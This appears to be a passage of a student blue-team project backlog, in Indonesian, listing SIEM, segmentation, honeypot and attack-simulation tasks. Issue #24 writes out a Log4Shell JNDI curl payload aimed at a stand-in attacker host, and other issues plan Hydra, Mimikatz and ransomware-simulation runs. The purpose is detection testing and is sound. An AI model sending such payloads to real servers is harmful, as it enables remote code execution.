# PROJECT SENTINEL
## Backlog & Acceptance Criteria
**FYEP Cybersecurity 2026 — InfraDigital Foundation**

---

### Anggota Tim

| Nama | Role |
|------|------|
| Dea Kristin Ginting | Project Manager + Documentation Lead |
| Rafli Sujatmiko | SIEM Engineer (Blue Team Core) |
| Triyas Niko Saputra | Network & Infrastructure Engineer |
| Yusmadani Firmansyah | Endpoint & Attack Simulator |
| Romadhona Fitri Lestari | Quality Assurance + Threat Analyst |

**Periode:** 11 Mei – 3 Juni 2026 | **Total:** 38 Issues | 4 Sprint Minggu

---

### Ringkasan Sprint

| Sprint | Periode | Issues | Fokus Utama |
|--------|---------|--------|-------------|
| Minggu 1 | 11–17 Mei | 8 issues | Fondasi: VM, GitHub, HLD, honeypot, IAM policy |
| Minggu 2 | 18–24 Mei | 11 issues | Implementasi core: SIEM rules, dashboard, Active Response, canary token, analisis kasus |
| Minggu 3 | 25–31 Mei | 13 issues | Simulasi serangan, validasi deteksi, QA, finalisasi Playbook, MITRE heatmap |
| Minggu 4 | 1–3 Juni | 6 issues | Finalisasi dokumen, dashboard, presentasi, rehearsal demo |

---

### Panduan Penggunaan

Setiap issue di dokumen ini merepresentasikan satu GitHub Issue. Copy judul dan acceptance criteria ke GitHub Issues, assign ke milestone yang sesuai, dan tandai selesai saat semua acceptance criteria terpenuhi. Issue yang bertanda **★ INOVASI** memberikan nilai tambah pada kategori penilaian Inovasi & Analisis (20%).

---

## MINGGU 1 — 11–17 MEI 2026 — FONDASI & SETUP

---

### #01 — Kick-off meeting: finalisasi roles, tools, dan working agreement
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[dokumentasi]` `[manajemen]` | **Assignee:** Dea

**Deskripsi**

Adakan sesi kick-off seluruh tim untuk menyepakati pembagian peran secara resmi, stack teknologi yang akan digunakan, ritme komunikasi (jadwal check-in harian/mingguan), dan aturan kolaborasi. Output sesi ini menjadi fondasi kerja tim selama satu bulan.

**Acceptance Criteria**

1. Notulen kick-off tersedia di repo GitHub (file KICKOFF.md atau di Wiki).
2. Setiap anggota memahami dan menyetujui scope tanggung jawabnya masing-masing.
3. Stack teknologi disepakati: pfSense, Wazuh, Cowrie/OpenCanary, Grafana/Kibana, Kali Linux.
4. Jadwal check-in mingguan dan channel komunikasi utama (WhatsApp/Discord) ditetapkan.
5. Aturan PR/merge dan naming convention issue di GitHub disepakati.

---

### #02 — Setup GitHub repo: Project board, Milestones (W1–W4), Labels
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[teknis]` `[manajemen]` | **Assignee:** Dea

**Deskripsi**

Konfigurasi repository GitHub sebagai pusat manajemen proyek. Buat GitHub Project board dengan kolom To Do / In Progress / Done, buat 4 Milestones sesuai minggu kerja, buat label standar (teknis, dokumentasi, inovasi, presentasi), dan assign semua issue ke milestone dan anggota yang sesuai.

**Acceptance Criteria**

1. Repository GitHub sudah ada dan semua anggota tim memiliki akses write.
2. GitHub Project board berhasil dibuat dengan minimal 3 kolom: To Do, In Progress, Done.
3. Empat Milestones tersedia: Minggu 1 (due 17 Mei), Minggu 2 (due 24 Mei), Minggu 3 (due 31 Mei), Minggu 4 (due 3 Juni).
4. Label minimal tersedia: teknis, dokumentasi, inovasi, presentasi, bug.
5. Semua issue dari backlog ini sudah dibuat di GitHub, di-assign ke anggota, dan dimasukkan ke milestone yang tepat.
6. README.md berisi deskripsi proyek, nama anggota, dan link ke Project board.

---

### #03 — Buat HLD topologi jaringan (draw.io / Visio) — draft pertama
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[dokumentasi]` | **Assignee:** Dea

**Deskripsi**

Rancang High-Level Design (HLD) arsitektur jaringan on-premise Global-Tech Corp yang mencakup zona jaringan (DMZ, LAN Produksi, Management Network), penempatan komponen utama (SIEM server, honeypot, EDR endpoint, firewall), dan alur log dari setiap segmen menuju SIEM. Diagram ini menjadi acuan semua anggota tim.

**Acceptance Criteria**

1. Diagram tersedia dalam format .drawio atau .pdf dan diunggah ke repo.
2. Diagram menampilkan minimal 3 zona jaringan: DMZ, LAN Produksi, Management Network.
3. Komponen ditampilkan: pfSense/firewall, Wazuh server, endpoint (Windows + Linux), honeypot, attacker VM.
4. Alur log dari endpoint menuju Wazuh ditunjukkan dengan panah berlabel.
5. Diagram di-review dan disetujui oleh Triyas (Network Engineer) sebelum issue ditutup.

---

### #04 — Setup VM environment: pfSense/OPNsense + konfigurasi VLAN dasar
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[teknis]` | **Assignee:** Triyas

**Deskripsi**

Bangun fondasi infrastruktur virtual menggunakan hypervisor (VirtualBox/VMware/Proxmox). Install dan konfigurasi pfSense atau OPNsense sebagai firewall utama, buat setidaknya 3 VLAN sebagai dasar micro-segmentation, dan pastikan konektivitas antar segmen berjalan sesuai rencana topologi.

**Acceptance Criteria**

1. pfSense atau OPNsense berhasil terinstall dan dapat diakses via web GUI.
2. Minimal 3 VLAN terkonfigurasi: VLAN-10 (Production), VLAN-20 (Management), VLAN-30 (DMZ/Honeypot).
3. Firewall rules dasar sudah diterapkan: Production tidak bisa direct-reach Management.
4. Konektivitas antar VM berhasil diuji dengan ping test yang terdokumentasi (screenshot).
5. Dokumen konfigurasi singkat (IP scheme, VLAN ID) diunggah ke repo.

---

### #05 — Install Wazuh server + konfigurasi Wazuh manager awal
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[teknis]` | **Assignee:** Rafli

**Deskripsi**

Deploy Wazuh All-in-One (manager + indexer + dashboard) pada VM Ubuntu Server. Wazuh adalah inti dari sistem deteksi — semua log dari endpoint dan network devices akan mengalir ke sini. Pastikan service berjalan stabil dan dashboard dapat diakses sebelum agent deployment di Minggu 2.

**Acceptance Criteria**

1. Wazuh manager, indexer, dan dashboard berhasil terinstall (ikuti dokumentasi resmi Wazuh 4.x).
2. Dashboard Wazuh dapat diakses via browser dari Management Network.
3. Service wazuh-manager, wazuh-indexer aktif dan tidak ada error di systemctl status.
4. Default admin credentials sudah diganti dengan credentials tim.
5. Screenshot dashboard awal (belum ada agent) diunggah ke repo sebagai bukti.

---

### #06 — Setup Kali Linux VM sebagai attacker machine + install tools dasar
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[teknis]` | **Assignee:** Yusmadani

**Deskripsi**

Siapkan mesin penyerang Kali Linux yang akan digunakan untuk semua simulasi serangan di Minggu 3. VM ini ditempatkan di segmen terpisah (Attacker Zone) dan hanya memiliki akses terbatas ke jaringan target sesuai skenario. Install dan verifikasi semua tools yang akan digunakan.

**Acceptance Criteria**

1. Kali Linux VM berhasil terinstall dan dapat boot normal.
2. Tools berikut terinstall dan dapat berjalan: nmap, hydra, mimikatz (via wine), metasploit, netcat.
3. VM Kali berada di segmen jaringan yang terpisah dari Production (VLAN Attacker atau terisolasi).
4. Konektivitas dari Kali ke target VM berhasil diverifikasi (ping + port check ke target).
5. Script sederhana untuk automasi test (bash) disiapkan dan diunggah ke repo.

---

### #07 — Install & konfigurasi awal honeypot (Cowrie SSH / OpenCanary) ★ INOVASI
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Yusmadani

**Deskripsi**

Deploy honeypot sebagai sistem peringatan dini (canary trap) di dalam jaringan internal. Cowrie adalah SSH/Telnet honeypot yang mencatat semua interaksi penyerang, sementara OpenCanary bisa mensimulasikan berbagai layanan (FTP, HTTP, SMB). Tempatkan honeypot di VLAN DMZ dengan fake credential yang terlihat menarik bagi penyerang.

**Acceptance Criteria**

1. Cowrie atau OpenCanary berhasil terinstall dan service berjalan aktif.
2. Honeypot mendengarkan pada port SSH (22 atau 2222) dan minimal satu port layanan lain (HTTP/SMB/FTP).
3. Log honeypot dapat dibaca dan berisi format JSON yang dapat di-parse.
4. Uji manual: SSH ke IP honeypot dari VM lain menghasilkan log interaksi yang tercatat.
5. Fake credential dan banner sistem telah dikustomisasi agar terlihat seperti server produksi nyata.
6. Honeypot ditempatkan di subnet/VLAN yang berbeda dari server produksi asli.

---

### #08 — Setup IAM & Access Control Policy: user roles dan least privilege
**Sprint:** Minggu 1 — 11–17 Mei | **Label:** `[teknis]` `[dokumentasi]` | **Assignee:** Romadhona

**Deskripsi**

Susun kebijakan Identity and Access Management (IAM) untuk seluruh infrastruktur lab Global-Tech Corp. Ini adalah komponen kritis yang menjawab celah utama insiden: penyerang dapat bergerak bebas karena tidak ada kontrol akses yang ketat antar sistem. Terapkan prinsip Least Privilege pada setiap akun yang digunakan di lab.

**Acceptance Criteria**

1. Dokumen Access Control Policy tersedia di repo folder /docs/iam/ dengan tabel: user/role, resource yang dapat diakses, level privilege, dan justifikasi bisnis.
2. Minimal 3 role user dikonfigurasi di Windows endpoint: Administrator, Standard User, dan Service Account dengan privilege yang berbeda.
3. Minimal 2 role user dikonfigurasi di Linux endpoint: root (terbatas sudo) dan user biasa.
4. Prinsip Least Privilege diterapkan: tidak ada akun yang memiliki akses melebihi kebutuhannya.
5. Policy IAM dikoordinasikan dengan Triyas untuk memastikan konsisten dengan firewall rules VLAN.
6. Screenshot konfigurasi user dan group policy diunggah ke repo sebagai bukti implementasi.

---

## MINGGU 2 — 18–24 MEI 2026 — IMPLEMENTASI CORE

---

### #09 — Deploy Wazuh agent ke semua endpoint (Windows + Linux)
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` | **Assignee:** Rafli

**Deskripsi**

Install Wazuh agent pada semua endpoint yang masuk dalam scope: minimal 1 Windows Server/10 dan 1 Ubuntu Linux. Agent akan mengirimkan log sistem, event Windows, syslog, dan file integrity data secara real-time ke Wazuh manager. Ini adalah syarat mutlak sebelum rule dan deteksi bisa diuji.

**Acceptance Criteria**

1. Wazuh agent terinstall dan terdaftar di Wazuh manager pada semua endpoint (minimal 2 endpoint).
2. Status agent di dashboard Wazuh menunjukkan "Active" (hijau) untuk semua endpoint.
3. Log Windows Event (Security, System, Application) sudah masuk ke Wazuh dari Windows endpoint.
4. Log syslog dan auth.log sudah masuk dari Linux endpoint.
5. File Integrity Monitoring (FIM) aktif pada direktori kritis: C:\Windows\System32 (Win) dan /etc, /bin (Linux).
6. Screenshot status agent dari dashboard diunggah ke repo.

---

### #10 — Buat custom SIEM rules berdasarkan MITRE ATT&CK (T1059, T1003, T1021, T1078)
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` | **Assignee:** Rafli

**Deskripsi**

Buat atau kustomisasi Wazuh detection rules yang dipetakan ke teknik MITRE ATT&CK spesifik yang relevan dengan skenario kasus (Colonial Pipeline + MGM). Rules ini harus mampu mendeteksi: eksekusi PowerShell mencurigakan (T1059.001), credential dumping (T1003), lateral movement via SMB/RDP (T1021), dan penggunaan akun yang dikompromikan (T1078).

**Acceptance Criteria**

1. Minimal 4 custom rules dibuat di Wazuh (file XML custom di /var/ossec/etc/rules/).
2. Setiap rule memiliki komentar yang mencantumkan MITRE Technique ID yang sesuai.
3. Rule T1059: alert terpicu saat PowerShell dijalankan dengan parameter encoded (-EncodedCommand).
4. Rule T1003: alert terpicu saat process lsass.exe diakses oleh proses selain sistem (simulasi Mimikatz).
5. Rule T1021: alert terpicu pada multiple failed RDP/SMB authentication dalam 60 detik.
6. Rule T1078: alert terpicu saat akun admin login di luar jam kerja (jam 22:00–06:00 WIB).
7. Semua file rules diunggah ke repo folder /wazuh-rules/.

---

### #11 — Setup Grafana/Kibana: dashboard real-time alert + log traffic
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` | **Assignee:** Rafli

**Deskripsi**

Buat dashboard monitoring yang memberikan visibilitas real-time kepada SOC team. Dashboard harus menampilkan informasi kunci dalam satu tampilan tunggal: status alert aktif, top talker IP, distribusi severity, dan trend kejadian per waktu. Dashboard ini adalah jawaban langsung untuk UR-01 (single dashboard untuk SOC).

**Acceptance Criteria**

1. Grafana atau Kibana berhasil terkoneksi ke Wazuh Indexer (Elasticsearch) sebagai data source.
2. Dashboard utama memiliki minimal 5 panel: jumlah alert aktif, alert per severity, top 10 source IP, alert timeline (per jam), dan distribusi rule yang terpicu.
3. Dashboard dapat di-refresh otomatis setiap 30 detik.
4. Dashboard dapat diakses dari browser di Management Network tanpa error.
5. Screenshot dashboard diunggah ke repo sebagai dokumentasi.

---

### #12 — Active Response: auto-block IP via pfSense API + notifikasi Telegram bot ★ INOVASI
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Triyas

**Deskripsi**

Implementasi kemampuan respons otomatis: saat Wazuh mendeteksi ancaman kritis (misal: brute force 5+ kali gagal dalam 60 detik), sistem secara otomatis menambahkan IP sumber ke blocklist pfSense via API DAN mengirimkan notifikasi ke Telegram bot dengan detail insiden. Ini mensimulasikan kemampuan SOAR (Security Orchestration, Automation and Response) tingkat enterprise.

**Acceptance Criteria**

1. Script active response (Python/Bash) berhasil dibuat dan terdaftar di Wazuh active-response.conf.
2. Script berhasil memanggil pfSense API untuk memblokir IP sumber secara otomatis.
3. Telegram bot berhasil dibuat (via BotFather) dan dapat menerima pesan dari script.
4. Pesan Telegram berisi: timestamp, IP sumber, jenis serangan, rule yang terpicu, dan nama aset yang diserang.
5. End-to-end test: trigger brute force dari Kali → alert Wazuh → IP diblokir di pfSense → notif Telegram diterima dalam < 30 detik.
6. Script dan konfigurasi diunggah ke repo folder /active-response/.

---

### #13 — Finalisasi micro-segmentation: firewall rules per VLAN + ACL
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` | **Assignee:** Triyas

**Deskripsi**

Implementasikan micro-segmentation penuh sesuai prinsip Zero Trust Network: setiap VLAN hanya bisa berkomunikasi dengan VLAN lain sesuai kebutuhan bisnis yang terdefinisi. Ini adalah mitigasi utama untuk mencegah lateral movement seperti yang terjadi pada kasus Colonial Pipeline dan MGM Resorts 2023.

**Acceptance Criteria**

1. Firewall rules di pfSense lengkap untuk semua interface VLAN.
2. Traffic dari VLAN Production ke VLAN Management diblokir secara default (whitelist only).
3. VLAN Honeypot hanya menerima koneksi inbound, tidak boleh melakukan koneksi outbound ke Production.
4. Test lateral movement: dari VM di VLAN Production tidak bisa langsung reach VM di VLAN Management (ping + SMB test gagal).
5. Semua rules didokumentasikan dalam tabel (source, dest, port, action) di repo.
6. Screenshot pfSense firewall rules diunggah sebagai bukti.

---

### #14 — Setup Nmap scheduled scan: asset discovery otomatis ke Wazuh
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` | **Assignee:** Triyas

**Deskripsi**

Implementasi asset discovery otomatis menggunakan Nmap yang dijadwalkan berjalan setiap hari. Hasil scan dikirimkan ke Wazuh sebagai log untuk mendeteksi perangkat baru atau tidak dikenal yang muncul di jaringan (rogue device detection). Ini menjawab SR-01 (Identification) dari requirements.

**Acceptance Criteria**

1. Script Nmap scan terjadwal berjalan via cron job (minimal 1x per hari).
2. Output Nmap disimpan dalam format yang dapat di-parse (XML atau grepable).
3. Script Python/Bash mem-parse output Nmap dan mengirimkan hasilnya ke Wazuh sebagai custom log.
4. Wazuh rule dibuat untuk mendeteksi "new host discovered" dan menghasilkan alert level medium.
5. Test: nyalakan VM baru di jaringan → dalam 24 jam muncul alert di Wazuh tentang host baru.
6. Script diunggah ke repo folder /asset-discovery/.

---

### #15 — Integrasi honeypot alert: Wazuh + Telegram notifikasi real-time ★ INOVASI
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Yusmadani

**Deskripsi**

Hubungkan log honeypot (Cowrie/OpenCanary) ke Wazuh agar setiap interaksi dengan honeypot langsung menghasilkan alert di SIEM dan notifikasi real-time ke Telegram. Ketika penyerang menyentuh honeypot, tim SOC langsung tahu dalam hitungan detik — ini adalah "canary trap" yang dipakai oleh perusahaan Fortune 500.

**Acceptance Criteria**

1. Log JSON dari Cowrie/OpenCanary berhasil di-forward ke Wazuh (via Filebeat atau direct).
2. Wazuh custom rule dibuat untuk mendeteksi koneksi ke honeypot dan menghasilkan alert severity HIGH.
3. Alert honeypot muncul di Wazuh dashboard dengan label "HONEYPOT TRIGGERED".
4. Notifikasi Telegram dikirim otomatis dalam < 15 detik setelah ada koneksi ke honeypot.
5. Pesan Telegram berisi: IP penyerang, port yang diakses, username yang dicoba, timestamp.
6. Test: SSH dari Kali ke honeypot → alert muncul di Wazuh → notif Telegram diterima.

---

### #16 — Buat LLD (Low-Level Design): sensor placement dan log flow diagram
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[dokumentasi]` | **Assignee:** Dea

**Deskripsi**

Kembangkan Low-Level Design (LLD) yang lebih detail dari HLD — mencakup IP address spesifik setiap komponen, port yang digunakan, jalur aliran log dari setiap sumber ke Wazuh, dan penempatan sensor (Wazuh agent, network tap). LLD adalah dokumen teknis yang digunakan engineer untuk implementasi dan troubleshooting.

**Acceptance Criteria**

1. Diagram LLD tersedia dalam format .drawio atau .pdf di repo.
2. Setiap komponen memiliki IP address yang spesifik dan terlabel dengan jelas.
3. Diagram aliran log (log flow) menunjukkan: endpoint → Wazuh agent → Wazuh manager → Indexer → Dashboard.
4. Port yang digunakan oleh setiap komunikasi antar komponen tercantum (misal: agent ke manager port 1514).
5. LLD telah diverifikasi kesesuaiannya dengan implementasi aktual oleh Triyas.
6. Dokumen LLD diunggah ke repo folder /docs/.

---

### #17 — Draft awal Incident Response Playbook (struktur + tipe insiden)
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[dokumentasi]` | **Assignee:** Dea

**Deskripsi**

Mulai menyusun kerangka Incident Response (IR) Playbook yang akan menjadi panduan tim SOC saat alarm berbunyi. Di Minggu 2, fokus pada pembuatan struktur dokumen dan draft prosedur untuk 2 tipe insiden utama. Playbook akan difinalisasi di Minggu 3 setelah simulasi serangan dilakukan dan direview oleh Romadhona.

**Acceptance Criteria**

1. Dokumen Playbook tersedia di repo (format .docx atau .md) dengan cover dan daftar isi.
2. Playbook mencakup minimal 4 tipe insiden: Ransomware/Enkripsi, Brute Force/Credential Attack, Lateral Movement, Honeypot Triggered.
3. Setiap tipe insiden memiliki struktur: Deteksi → Containment → Eradication → Recovery → Lessons Learned.
4. Prosedur untuk minimal 2 tipe insiden sudah di-draft lengkap (bukan hanya outline).
5. Playbook mencantumkan contact person (nama + role) untuk setiap tahap eskalasi.

---

### #18 — Deploy canary token di file dan folder sensitif endpoint ★ INOVASI
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Romadhona, Rafli

**Deskripsi**

Pasang canary token pada file dan folder yang tampak sensitif di endpoint Windows dan Linux. Saat penyerang membuka file tersebut selama proses reconnaissance atau exfiltration, token mengirimkan sinyal ke Wazuh dan memicu alert real-time. Teknik ini melengkapi honeypot dengan lapisan deception yang lebih granular di level file system.

**Acceptance Criteria**

1. Canary token terpasang di minimal 2 lokasi: C:\Users\Admin\Documents\credentials.xlsx dan /etc/db_passwords.conf (gunakan canarytokens.org atau self-hosted).
2. Konfigurasi canary token menghasilkan sinyal yang dapat ditangkap sebagai log Wazuh.
3. Wazuh custom rule dibuat untuk mendeteksi trigger canary token dengan severity HIGH.
4. Alert muncul di dashboard dengan label "CANARY TOKEN TRIGGERED - Possible Data Access".
5. Test: buka file canary dari VM lain → alert muncul di Wazuh → notif Telegram diterima dalam < 30 detik.
6. Dokumentasi lokasi dan tujuan setiap canary token diunggah ke repo folder /deception/.

---

### #19 — Riset dan analisis mendalam kasus nyata: Log4Shell 2021 + MGM/Caesars 2023
**Sprint:** Minggu 2 — 18–24 Mei | **Label:** `[dokumentasi]` | **Assignee:** Romadhona

**Deskripsi**

Lakukan riset mendalam terhadap dua kasus nyata yang menjadi referensi utama Project Sentinel. Analisis ini bukan sekadar ringkasan, melainkan pemetaan teknis yang menghubungkan setiap teknik serangan pada kasus nyata dengan solusi yang dibangun oleh tim. Dokumen ini akan menjadi bagian presentasi dengan bobot penilaian 10% (Inovasi & Analisis).

**Acceptance Criteria**

1. Analisis Log4Shell 2021 (CVE-2021-44228) mencakup: timeline kejadian, mekanisme eksploitasi JNDI lookup, dampak global, dan teknik deteksi yang seharusnya diterapkan.
2. Analisis MGM/Caesars 2023 mencakup: entry point (social engineering via IT helpdesk), teknik lateral movement, dampak bisnis (kerugian +$100 juta MGM), dan pelajaran yang dipetik.
3. Setiap kasus dipetakan ke minimal 3 MITRE ATT&CK technique yang relevan.
4. Dokumen menjelaskan keterkaitan langsung antara kasus nyata dengan solusi Project Sentinel.
5. Dokumen analisis (2–3 halaman) diunggah ke repo folder /docs/case-analysis/ dalam format .md dan .pdf.
6. Romadhona mempresentasikan bagian ini kepada tim sebelum Minggu 3 sebagai persiapan presentasi final.

---

## MINGGU 3 — 25–31 MEI 2026 — SIMULASI & VALIDASI

---

### #20 — Simulasi serangan 1: Brute Force SSH/RDP + validasi Active Response
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` | **Assignee:** Yusmadani

**Deskripsi**

Jalankan simulasi brute force terhadap SSH (Linux) dan RDP (Windows) menggunakan Hydra dari Kali Linux. Ini adalah skenario serangan pertama sekaligus validasi end-to-end untuk Active Response yang dibangun di Issue #12: sistem harus mendeteksi, memblokir IP di pfSense, dan mengirim notifikasi Telegram dalam waktu kurang dari 30 detik.

**Acceptance Criteria**

1. Serangan brute force SSH berhasil dijalankan dari Kali Linux menggunakan Hydra (minimal 20 percobaan dengan wordlist rockyou.txt).
2. Serangan brute force RDP berhasil dijalankan menggunakan crowbar atau ncrack.
3. Alert muncul di Wazuh dashboard dalam < 60 detik setelah serangan dimulai dengan severity HIGH.
4. Active Response berjalan: IP Kali otomatis diblokir di pfSense dalam < 30 detik setelah threshold terpenuhi.
5. Notifikasi Telegram diterima dengan format lengkap: timestamp, IP sumber, jenis serangan, nama aset.
6. Screenshot alert Wazuh + log Hydra + notif Telegram diunggah ke repo /evidence/week3/bruteforce/.
7. Rekaman layar (OBS) seluruh proses tersimpan sebagai backup demo.

---

### #21 — Simulasi serangan 2: Port Scan agresif (Nmap) + deteksi reconnaissance
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` | **Assignee:** Yusmadani

**Deskripsi**

Lakukan port scanning agresif dari Kali Linux menggunakan Nmap untuk mensimulasikan fase reconnaissance penyerang. Wazuh harus mampu mendeteksi aktivitas scanning ini melalui log firewall pfSense yang di-forward ke SIEM. Ini merepresentasikan tahap awal serangan sebelum penyerang mencari celah lebih dalam.

**Acceptance Criteria**

1. Nmap scan agresif dijalankan: `nmap -sS -sV -A -T4` terhadap range IP jaringan target.
2. Log pfSense (connection drop/reject) berhasil di-forward ke Wazuh.
3. Alert port scan muncul di Wazuh dengan label yang menunjukkan aktivitas reconnaissance.
4. Alert mencantumkan IP sumber scanner, range IP yang di-scan, dan jumlah port yang diakses.
5. Screenshot hasil Nmap + alert Wazuh diunggah ke repo /evidence/week3/recon/ sebagai evidence.
6. Rekaman OBS seluruh proses tersimpan.

---

### #22 — Simulasi serangan 3: Mimikatz credential dump + lateral movement detection
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` | **Assignee:** Yusmadani

**Deskripsi**

Simulasikan teknik credential harvesting menggunakan Mimikatz pada Windows endpoint untuk menguji deteksi T1003 (OS Credential Dumping). Ini adalah teknik yang digunakan pada kasus MGM Resorts 2023 — penyerang mencuri kredensial admin untuk bergerak lateral. Micro-segmentation harus membuktikan kemampuannya menghentikan pergerakan lateral.

**Acceptance Criteria**

1. Simulasi credential dumping dijalankan pada Windows endpoint (Mimikatz sekurangnya mencoba mengakses lsass.exe).
2. Alert Wazuh terpicu dengan rule T1003 dalam < 2 menit setelah eksekusi.
3. Alert mencantumkan: nama proses yang mencurigakan, user yang menjalankan, waktu kejadian.
4. Percobaan lateral movement pasca credential dump (SMB/WMI ke host lain) diblokir oleh micro-segmentation.
5. Alert lateral movement attempt muncul sebagai event terpisah di Wazuh (rule T1550.002).
6. Log lengkap + screenshot diunggah ke repo /evidence/week3/lateral-movement/ sebagai bukti laporan pen-test.

---

### #23 — Simulasi serangan 4: Ransomware behavior (mass file encryption) + EDR alert
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` | **Assignee:** Yusmadani

**Deskripsi**

Simulasikan perilaku ransomware menggunakan script yang melakukan enkripsi massal file untuk menguji kemampuan Wazuh File Integrity Monitoring (FIM) dalam mendeteksi perubahan massal pada file sistem. Terinspirasi dari kasus MGM Caesars 2023 di mana database produksi dienkripsi penyerang.

**Acceptance Criteria**

1. Script ransomware simulator (Python/PowerShell) yang mengenkripsi file di direktori tertentu dibuat dan diunggah ke repo.
2. Script dijalankan di Windows endpoint yang terpasang Wazuh agent dengan FIM aktif.
3. Alert FIM muncul di Wazuh dalam < 5 menit setelah enkripsi dimulai, menunjukkan perubahan massal pada banyak file.
4. Alert memiliki severity CRITICAL dan mencantumkan direktori yang terdampak.
5. Test membuktikan bahwa enkripsi melewati threshold (misal: >50 file berubah dalam 1 menit = alert).
6. Screenshot alert + log FIM diunggah ke repo /evidence/week3/ransomware/.

---

### #24 — Simulasi Log4Shell (CVE-2021-44228): payload JNDI + custom detection rule ★ INOVASI
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Yusmadani

**Deskripsi**

Simulasikan eksploitasi Log4Shell dengan mengirimkan HTTP request berisi payload JNDI ke web server target. Buat custom Wazuh rule yang secara spesifik mendeteksi pola string `${jndi:}` pada log web server. Ini adalah referensi kasus nyata 2021 yang tercantum di rubrik penilaian dan sudah dianalisis oleh Romadhona di Minggu 2.

**Acceptance Criteria**

1. Web server sederhana (Apache/Nginx atau aplikasi Java) terinstall di salah satu endpoint dan log-nya di-forward ke Wazuh.
2. Custom Wazuh rule dibuat yang mendeteksi string `${jndi:` pada HTTP access log.
3. Payload simulasi Log4Shell dikirim dari Kali: `curl -H "X-Api-Version: ${jndi:ldap://attacker/a}" http://target/`
4. Alert muncul di Wazuh dalam < 30 detik dengan label "Log4Shell Exploitation Attempt - CVE-2021-44228".
5. Rule file (XML) diunggah ke repo folder /wazuh-rules/ dengan komentar referensi CVE dan teknik MITRE T1190.
6. Screenshot HTTP request + alert Wazuh diunggah ke repo /evidence/week3/log4shell/.

---

### #25 — Identity-based detection: suspicious admin login (terinspirasi kasus MGM 2023) ★ INOVASI
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Yusmadani, Ramadhona

**Deskripsi**

Implementasi deteksi berbasis identitas yang terinspirasi dari kasus MGM Caesars 2023 — penyerang menggunakan kredensial admin yang sah namun dengan perilaku tidak biasa. Rule mendeteksi login admin di jam yang tidak wajar atau dari IP yang berbeda dari biasanya, langsung sesuai dengan custom rule T1078 yang dibuat di Minggu 2.

**Acceptance Criteria**

1. Custom Wazuh rule aktif yang mendeteksi login user admin di luar jam kerja (22:00–06:00 WIB).
2. Rule menghasilkan alert severity HIGH dengan label "Suspicious Admin Login - Outside Business Hours".
3. Test: login RDP/SSH dengan akun admin pada jam 23:00 (ubah system clock VM jika perlu) → alert terpicu.
4. Opsional: rule tambahan yang mendeteksi admin login dari IP baru yang belum pernah login sebelumnya.
5. Alert mencantumkan: username, waktu login, IP sumber, nama host target.
6. Deskripsi rule mencantumkan referensi "Inspired by MGM Resorts 2023 breach - MITRE T1078".

---

### #26 — Fine-tuning SIEM rules: eliminasi false positive pasca simulasi
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` | **Assignee:** Rafli

**Deskripsi**

Setelah semua simulasi serangan dijalankan, lakukan evaluasi dan tuning terhadap rules yang menghasilkan terlalu banyak false positive atau noise. SIEM yang baik bukan hanya yang banyak alert-nya, tapi yang alert-nya relevan dan actionable. Tuning ini menunjukkan kematangan konfigurasi kepada juri.

**Acceptance Criteria**

1. Review dilakukan terhadap semua alert yang muncul selama simulasi Minggu 3: kategorikan sebagai True Positive, False Positive, atau True Negative.
2. Minimal 2 rule dioptimasi: threshold disesuaikan atau kondisi dipersempit untuk mengurangi noise.
3. Setelah tuning, rasio signal-to-noise alert meningkat (false positive berkurang secara terukur).
4. Dokumen tuning log (sebelum vs sesudah, berisi perbandingan jumlah alert TP dan FP) diunggah ke repo sebagai SIEM_TUNING.md.
5. Screenshot dashboard sebelum dan sesudah fine-tuning diunggah sebagai perbandingan visual.

---

### #27 — MITRE ATT&CK Navigator: mapping rules ke heatmap coverage deteksi ★ INOVASI
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` `[inovasi]` | **Assignee:** Rafli

**Deskripsi**

Gunakan MITRE ATT&CK Navigator untuk membuat layer file yang memetakan setiap Wazuh rule ke teknik ATT&CK spesifik. Export sebagai heatmap visual yang menunjukkan coverage deteksi tim sekaligus blind spot yang masih ada. Ini adalah cara profesional yang digunakan SOC analyst untuk mempresentasikan postur deteksi kepada manajemen dan juri.

**Acceptance Criteria**

1. MITRE ATT&CK Navigator dibuka (https://mitre-attack.github.io/attack-navigator/) dan layer JSON dibuat.
2. Minimal 8 technique ID terpetakan: T1046, T1110, T1003, T1550.002, T1059.001, T1078, T1190, T1486.
3. Heatmap menggunakan color coding: hijau = fully detected, kuning = partially detected, merah = blind spot.
4. File layer ATT&CK Navigator (.json) diunggah ke repo folder /mitre/.
5. Heatmap di-export sebagai PNG dan diunggah ke repo folder /docs/.
6. Heatmap digunakan dalam slide presentasi oleh Romadhona untuk menjelaskan coverage deteksi tim.

---

### #28 — Validasi honeypot: end-to-end trigger, log collection, dan alert chain
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[teknis]` | **Assignee:** Triyas

**Deskripsi**

